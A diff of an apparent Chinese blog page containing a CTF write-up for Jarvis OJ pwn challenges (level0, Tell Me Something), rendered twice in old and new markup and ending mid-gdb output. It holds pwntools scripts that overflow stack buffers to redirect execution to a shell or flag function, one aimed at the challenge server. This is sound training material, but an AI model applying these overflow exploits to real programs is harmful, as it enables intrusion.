@@ -36,7 +36,14 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="iosmosis">
     <meta name="description" itemprop="description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup
-[XMAN]level0进行chack123456[*] &#39;/home/ios/Desktop/pwn0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
+[XMAN]level0进行chack
+[*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
 
 ">
     <meta name="keywords" content="null,Pwn,writeup,Jarvis OJ,栈溢出">
@@ -71,7 +78,14 @@
     <meta property="og:title" content="Jarvis OJ Pwn writeup | iosmosis&#39;s blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup
-[XMAN]level0进行chack123456[*] &#39;/home/ios/Desktop/pwn0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
+[XMAN]level0进行chack
+[*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
 
 ">
     <meta property="og:article:tag" content="Pwn"> <meta property="og:article:tag" content="writeup"> <meta property="og:article:tag" content="Jarvis OJ"> <meta property="og:article:tag" content="栈溢出"> 
@@ -84,7 +98,14 @@
     <!-- The Twitter Card protocol -->
     <meta name="twitter:title" content="Jarvis OJ Pwn writeup | iosmosis&#39;s blog">
     <meta name="twitter:description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup
-[XMAN]level0进行chack123456[*] &#39;/home/ios/Desktop/pwn0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
+[XMAN]level0进行chack
+[*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
 
 ">
     <meta name="twitter:image" content="/img/favicon.png">
@@ -124,7 +145,14 @@
     "datePublished": "3月 21, 2018",
     "dateModified": "6月 09, 2018",
     "description": "此篇记录关于Jarvis OJ Pwn所有题目的writeup
-[XMAN]level0进行chack123456[*] &#39;/home/ios/Desktop/pwn0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
+[XMAN]level0进行chack
+[*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
 
 ",
     "mainEntityOfPage": {
@@ -503,7 +531,14 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
-<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/home/ios/Desktop/pwn0'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
+<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/Desktop/pwn0'</span>
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+</code></pre>
 <ul>
 <li><a id="more"></a>
 <the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
@@ -511,32 +546,194 @@
 <p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
 <p>main函数里跳转到了vulnerable_function()</p>
 <h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以看到<span class="built_in">read</span>可读的大小为0x200 512字节</div><div class="line">buf大小为0x80字节</div></pre></td></tr></table></figure>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">可以看到read可读的大小为0x200 512字节
+buf大小为0x80字节
+</code></pre>
 <h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
 <p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buf <span class="number">0x80</span></div><div class="line">ebp <span class="number">0x8</span></div><div class="line">淹没bp <span class="number">0x80</span>+<span class="number">0x8</span></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div></pre></td></tr></table></figure>
-<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn0'</span>)</div><div class="line"></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> +p64(callsystem_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ python pwn0.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn0'</span>: pid 3517</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">core               peda-session-pwn50.txt  pwn0.py    pwn50.py</div><div class="line">peda-session-pwn0.txt  pwn0               pwn50</div><div class="line">$</div></pre></td></tr></table></figure>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">buf <span class="token number">0x80</span>
+ebp <span class="token number">0x8</span>
+淹没bp <span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x8</span>
+callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>
+</code></pre>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn0'</span><span class="token punctuation">)</span>
+
+callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/Desktop$ python pwn0.py
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./pwn0'</span><span class="token keyword">:</span> pid 3517
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+Hello, World
+$ <span class="token function">ls</span>
+core               peda-session-pwn50.txt  pwn0.py    pwn50.py
+peda-session-pwn0.txt  pwn0               pwn50
+$
+</code></pre>
 <p>成功getshell</p>
-<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><h3 id="先进行check"><a href="#先进行check" class="headerlink" title="先进行check"></a>先进行check</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ checksec ./guestbook</div><div class="line">[*] <span class="string">'/home/ios/Desktop/guestbook'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
+<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><h3 id="先进行check"><a href="#先进行check" class="headerlink" title="先进行check"></a>先进行check</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/Desktop$ checksec ./guestbook
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/Desktop/guestbook'</span>
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+</code></pre>
 <p>没开任何保护 64位ELF</p>
 <h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/4.jpg" alt="ida1"></p>
 <p>可以看到程序 只是进行了 write read </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">good_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  FILE <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
+  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Fh] [rbp-9h]</span>
+
+  v0 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    result <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    buf <span class="token operator">=</span> result<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
 <p>找到关键函数 good_game </p>
 <h3 id="思路很简单-简单栈溢出并且覆盖ret为good-game地址即可"><a href="#思路很简单-简单栈溢出并且覆盖ret为good-game地址即可" class="headerlink" title="思路很简单 简单栈溢出并且覆盖ret为good_game地址即可"></a>思路很简单 简单栈溢出并且覆盖ret为good_game地址即可</h3><h3 id="good-game-地址："><a href="#good-game-地址：" class="headerlink" title="good_game 地址："></a>good_game 地址：</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/5.jpg" alt="ida1"><br>通过IDA即可找到  0x400620</p>
-<h3 id="GDB调试找到溢出偏移"><a href="#GDB调试找到溢出偏移" class="headerlink" title="GDB调试找到溢出偏移"></a>GDB调试找到溢出偏移</h3><p>加载程序 并尝试运行程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ file guestbook</div><div class="line">Reading symbols from guestbook...(no debugging symbols found)...done.</div><div class="line">gdb-peda$ pattern create 300</div><div class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span></div></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ios/Desktop/guestbook AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">Input your message:</div><div class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</div><div class="line">I have received your message, Thank you!</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x29 (<span class="string">')'</span>)</div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0x7ffff7b042c0 (&lt;__write_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</div><div class="line">RDX: 0x29 (<span class="string">')'</span>)</div><div class="line">RSI: 0x400738 (<span class="string">"I have received your message, Thank you!\n"</span>)</div><div class="line">RDI: 0x1 </div><div class="line">RBP: 0x400690 (&lt;__libc_csu_init&gt;:	push   r15)</div><div class="line">RSP: 0x7fffffffde28 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">RIP: 0x400525 (&lt;main+69&gt;:	ret)</div><div class="line">R8 : 0x400700 (&lt;__libc_csu_fini&gt;:	repz ret)</div><div class="line">R9 : 0x7ffff7de7ab0 (&lt;_dl_fini&gt;:	push   rbp)</div><div class="line">R10: 0x37b </div><div class="line">R11: 0x246 </div><div class="line">R12: 0x400526 (&lt;_start&gt;:	xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdf00 --&gt; 0x2 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x10206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x400514 &lt;main+52&gt;:	mov    edi,0x1</div><div class="line">   0x400519 &lt;main+57&gt;:	call   0x400480 &lt;write@plt&gt;</div><div class="line">   0x40051e &lt;main+62&gt;:	add    rsp,0x88</div><div class="line">=&gt; 0x400525 &lt;main+69&gt;:	ret    </div><div class="line">   0x400526 &lt;_start&gt;:	xor    ebp,ebp</div><div class="line">   0x400528 &lt;_start+2&gt;:	mov    r9,rdx</div><div class="line">   0x40052b &lt;_start+5&gt;:	pop    rsi</div><div class="line">   0x40052c &lt;_start+6&gt;:	mov    rdx,rsp</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffde28 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0008| 0x7fffffffde30 (<span class="string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0016| 0x7fffffffde38 (<span class="string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0024| 0x7fffffffde40 (<span class="string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0032| 0x7fffffffde48 (<span class="string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0040| 0x7fffffffde50 (<span class="string">"AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0048| 0x7fffffffde58 (<span class="string">"AAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0056| 0x7fffffffde60 (<span class="string">"ZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x0000000000400525 <span class="keyword">in</span> main ()</div></pre></td></tr></table></figure>
-<p>发现错误停止在了 main函数 的ret处<br>接下来计算缓冲区的大小<br>由于程序使用的内存地址不能大于0x00007fffffffffff，PC指针并没有指向类似于0x41414141那样地址，但是ret指令等于pop rip，可以通过查看栈顶指针的值确定下一步程序运行的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffde28:	0x41416d4141514141</div><div class="line">gdb-peda$ pattern offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
-<p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br>得到偏移为136 所以我们就可以构造exp了</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./guestbook')</span></div><div class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9876</span>)</div><div class="line">payload = <span class="string">'A'</span>*<span class="number">136</span> + p64(<span class="number">0x400620</span>)</div><div class="line">p.recvuntil(<span class="string">'Input your message:\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"><span class="keyword">print</span> p.recv()</div></pre></td></tr></table></figure>
+<h3 id="GDB调试找到溢出偏移"><a href="#GDB调试找到溢出偏移" class="headerlink" title="GDB调试找到溢出偏移"></a>GDB调试找到溢出偏移</h3><p>加载程序 并尝试运行程序</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ <span class="token function">file</span> guestbook
+Reading symbols from guestbook<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
+gdb-peda$ pattern create 300
+<span class="token string">'AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
+</code></pre>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ r
+Starting program: /home/ios/Desktop/guestbook AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Input your message:
+AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA<span class="token punctuation">(</span>AADAA<span class="token punctuation">;</span>AA<span class="token punctuation">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%<span class="token punctuation">(</span>A%DA%<span class="token punctuation">;</span>A%<span class="token punctuation">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+I have received your message, Thank you<span class="token operator">!</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
+RAX: 0x29 <span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>
+RBX: 0x0 
+RCX: 0x7ffff7b042c0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__write_nocancel+7<span class="token operator">></span>:    <span class="token function">cmp</span>    rax,0xfffffffffffff001<span class="token punctuation">)</span>
+RDX: 0x29 <span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>
+RSI: 0x400738 <span class="token punctuation">(</span><span class="token string">"I have received your message, Thank you!\n"</span><span class="token punctuation">)</span>
+RDI: 0x1 
+RBP: 0x400690 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>
+RSP: 0x7fffffffde28 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+RIP: 0x400525 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+69<span class="token operator">></span>:    ret<span class="token punctuation">)</span>
+R8 <span class="token keyword">:</span> 0x400700 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">></span>:    repz ret<span class="token punctuation">)</span>
